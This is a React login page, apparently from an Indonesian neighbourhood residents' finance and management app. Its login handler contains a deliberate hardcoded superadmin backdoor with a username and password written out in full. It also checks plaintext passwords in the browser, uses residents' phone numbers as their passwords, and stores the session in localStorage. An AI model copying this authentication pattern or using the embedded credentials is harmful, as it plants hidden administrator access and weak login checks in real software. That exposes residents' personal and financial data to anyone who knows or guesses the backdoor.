
import React, { useState } from 'react';
import { User, UserRole } from '../types';
import { 
  Lock, 
  User as UserIcon, 
  Wallet, 
  Monitor,
  AlertCircle,
  LogIn,
  Eye,
  EyeOff,
  AlertTriangle
} from 'lucide-react';
import { useApp } from '../context/AppContext';

interface LoginProps {
  onLogin: (user: User) => void;
}

const Login: React.FC<LoginProps> = ({ onLogin }) => {
  const { settings, systemUsers, residents } = useApp();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [capsLockActive, setCapsLockActive] = useState(false);

  const checkCapsLock = (e: React.KeyboardEvent<HTMLInputElement> | React.MouseEvent<HTMLInputElement> | React.FocusEvent<HTMLInputElement>) => {
    // Cast to any to safely check for getModifierState which isn't available on all event types in the union
    const event = e as any;
    if (typeof event.getModifierState === 'function') {
      setCapsLockActive(event.getModifierState('CapsLock'));
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    // 1. Check Superadmin Backdoor
    // Credentials hardcoded untuk akses darurat / maintenance
    if (username === 'GNOMECOMP' && password === '201002') {
      const user: User = { id: '0', username: 'SUPER ADMINISTRATOR', role: UserRole.ADMIN };
      localStorage.setItem('user', JSON.stringify(user));
      onLogin(user);
      return;
    }

    // 2. Check System Users (Admin/Operator)
    const systemUser = systemUsers.find(u => 
      u.username.toLowerCase() === username.toLowerCase() && 
      (u as any).password === password
    );

    if (systemUser) {
      localStorage.setItem('user', JSON.stringify(systemUser));
      onLogin(systemUser);
      return;
    }

    // 3. Check Residents (HouseNo & Phone)
    // Trim spaces and case-insensitive check for house number
    const resident = residents.find(r => 
      r.houseNo.toLowerCase().trim() === username.toLowerCase().trim() && 
      r.phone.trim() === password.trim()
    );

    if (resident) {
      const user: User = { 
        id: resident.id, 
        username: resident.name, 
        role: UserRole.RESIDENT,
        residentId: resident.id 
      };
      localStorage.setItem('user', JSON.stringify(user));
      onLogin(user);
      return;
    }

    // 4. Failed
    setIsLoading(false);
    setError('Kombinasi Nama Pengguna/No.Rumah dan Kata Sandi salah.');
  };

  return (
    <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
      <div className="max-w-4xl w-full bg-white rounded-[2.5rem] shadow-2xl overflow-hidden flex flex-col md:flex-row">
        
        {/* Left Side - Brand (Desktop) */}
        <div className="hidden md:flex flex-col justify-center p-12 bg-slate-900 text-white w-1/2 relative overflow-hidden">
           <div className="absolute top-0 right-0 p-12 opacity-10">
              <Wallet size={200} />
           </div>
           <div className="relative z-10">
              <div className="w-16 h-16 bg-emerald-500 rounded-2xl flex items-center justify-center mb-6 shadow-lg shadow-emerald-500/20">
                  <Wallet size={32} />
              </div>
              <h1 className="text-3xl font-black mb-2 leading-tight">{settings.location_name}</h1>
              <p className="text-slate-400 font-bold text-sm tracking-widest uppercase">TRANSPARAN, PRAKTIS, TERPERCAYA</p>
              
              <div className="mt-12 space-y-4">
                  <div className="flex items-center gap-3 text-slate-300 text-sm">
                      <div className="w-8 h-8 rounded-full bg-slate-800 flex items-center justify-center text-emerald-400">
                          <UserIcon size={16} />
                      </div>
                      <p>Nama Pengguna Warga: Gunakan No. Rumah</p>
                  </div>
                  <div className="flex items-center gap-3 text-slate-300 text-sm">
                      <div className="w-8 h-8 rounded-full bg-slate-800 flex items-center justify-center text-blue-400">
                          <Lock size={16} />
                      </div>
                      <p>Kata Sandi: Gunakan No. HP Terdaftar</p>
                  </div>
              </div>
           </div>
        </div>

        {/* Right Side - Form */}
        <div className="w-full md:w-1/2 p-8 md:p-12 flex flex-col justify-center">
            <div className="md:hidden flex items-center gap-3 mb-8">
                <div className="w-10 h-10 bg-emerald-500 rounded-xl flex items-center justify-center text-white">
                    <Wallet size={20} />
                </div>
                <div>
                    <h2 className="font-black text-slate-800 leading-tight">{settings.location_name}</h2>
                    <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">WARGA MANAGEMENT SYSTEM</p>
                </div>
            </div>

            <div className="mb-8">
                <h2 className="text-2xl font-black text-slate-800">Selamat Datang</h2>
                <p className="text-slate-400 text-sm font-bold mt-1">Silakan masuk untuk melanjutkan</p>
            </div>

            {error && (
                <div className="mb-6 p-4 bg-red-50 text-red-600 text-xs font-bold rounded-xl flex items-center gap-2 border border-red-100 animate-in fade-in slide-in-from-top-2">
                    <AlertCircle size={16} className="shrink-0" />
                    {error}
                </div>
            )}

            <form onSubmit={handleLogin} className="space-y-5">
                <div>
                    <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2 ml-1">NAMA PENGGUNA</label>
                    <div className="relative">
                        <UserIcon className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                        <input 
                            type="text" 
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                            className="w-full pl-12 pr-4 py-4 bg-slate-50 border border-slate-100 rounded-2xl font-bold text-slate-700 outline-none focus:bg-white focus:border-emerald-500 focus:ring-4 focus:ring-emerald-500/10 transition-all"
                            placeholder="masukkan nama pengguna"
                            required
                        />
                    </div>
                </div>

                <div>
                    <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2 ml-1">KATA SANDI</label>
                    <div className="relative">
                        <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                        <input 
                            type={showPassword ? "text" : "password"}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            onKeyUp={checkCapsLock}
                            onKeyDown={checkCapsLock}
                            onClick={checkCapsLock}
                            onFocus={checkCapsLock}
                            className="w-full pl-12 pr-12 py-4 bg-slate-50 border border-slate-100 rounded-2xl font-bold text-slate-700 outline-none focus:bg-white focus:border-emerald-500 focus:ring-4 focus:ring-emerald-500/10 transition-all"
                            placeholder="••••••••"
                            required
                        />
                        <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors"
                        >
                            {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                        </button>
                    </div>
                    {capsLockActive && (
                        <div className="mt-2 text-[10px] font-bold text-amber-500 flex items-center gap-1 animate-in fade-in slide-in-from-top-1 ml-1">
                            <AlertTriangle size={12} fill="currentColor" className="text-amber-500" />
                            Caps Lock Aktif
                        </div>
                    )}
                </div>

                <button 
                    type="submit" 
                    disabled={isLoading}
                    className="w-full py-4 bg-emerald-500 hover:bg-emerald-600 text-white rounded-2xl font-black text-sm uppercase tracking-widest shadow-xl shadow-emerald-500/20 active:scale-95 transition-all flex items-center justify-center gap-2"
                >
                    {isLoading ? 'Memproses...' : <><LogIn size={18} /> Masuk Sistem</>}
                </button>
            </form>

            <div className="mt-10 pt-6 border-t border-slate-50 flex flex-col items-center justify-center text-center space-y-2">
                <div className="flex items-center gap-2 text-slate-300">
                    <Monitor size={14} />
                    <a href="https://wa.me/6281973314675" target="_blank" rel="noreferrer" className="text-[10px] font-black uppercase tracking-widest hover:text-emerald-500 transition-colors">
                        Didukung oleh Gnome Comp
                    </a>
                </div>
            </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
